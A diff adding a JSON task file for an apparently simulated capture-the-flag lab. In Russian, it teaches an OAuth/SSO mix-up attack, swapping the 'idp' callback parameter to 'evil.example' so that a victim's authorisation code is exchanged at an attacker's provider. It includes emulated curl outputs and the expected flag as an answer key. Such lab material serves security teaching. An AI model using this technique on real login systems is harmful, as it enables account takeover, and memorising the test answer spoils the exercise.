@@ -1,0 +1,42 @@
+{
+  "id": "web-sso-mixup",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{0auth_m1xup_c0d3_c0nfus10n}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: OAuth/SSO mix-up\n\n`shop.local` доверяет двум провайдерам (`acmeid.example` и `corp.example`).\nНа callback оно берёт `idp` из параметров запроса, а не из сессии, и\nобменивает код у того, кого назвал клиент. Подмени провайдера на свой.\n\n1. Начни вход через acmeid (сервер запомнил idp=acmeid в сессии):\n   curl -s -i 'https://shop.local/login?provider=acmeid'\n2. Жертва авторизовалась у `corp.example`, пришёл `code=CODE_FROM_CORP`.\n   Подставь СВОЙ провайдер в параметре `idp`:\n   curl -s 'https://shop.local/cb?code=CODE_FROM_CORP&idp=evil.example'\n3. Приложение обменяет код у evil.example и примет чужой токен — флаг.\n4. Запиши последнюю строку в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local SSO)",
+      "cases": [
+        {
+          "match": "idp=evil",
+          "example": "-s 'https://shop.local/cb?code=CODE_FROM_CORP&idp=evil.example'",
+          "output": "{\"status\":\"logged_in\",\"subject\":\"victim@corp.example\",\"note\":\"callback trusted idp from request, not session\",\"flag\":\"nto{0auth_m1xup_c0d3_c0nfus10n}\"}\n"
+        },
+        {
+          "match": "cb\\?code",
+          "example": "-s 'https://shop.local/cb?code=CODE_FROM_CORP&state=abc'",
+          "output": "{\"error\":\"invalid_grant\",\"reason\":\"code not issued by expected idp\"}\n"
+        },
+        {
+          "match": "login\\?provider",
+          "example": "-s -i 'https://shop.local/login?provider=acmeid'",
+          "output": "HTTP/1.1 302 Found\nSet-Cookie: idp=acmeid; Path=/\nLocation: https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://shop.local/cb&state=abc\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются /login?provider и /cb на shop.local.\n"
+    }
+  }
+}
